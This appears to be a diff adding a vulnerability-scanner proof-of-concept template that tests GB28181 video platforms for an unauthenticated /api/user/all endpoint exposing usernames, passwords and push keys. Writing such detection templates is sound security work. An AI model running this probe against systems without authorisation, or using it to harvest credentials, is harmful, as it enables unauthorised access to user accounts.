@@ -1,0 +1,13 @@
+name: poc-yaml-gb28181-unauthorized
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/user/all
+    expression: response.status == 200 && response.body_string.contains("password") && response.body_string.contains("name") && response.body_string.contains("pushKey")
+expression: r0()
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/138859985
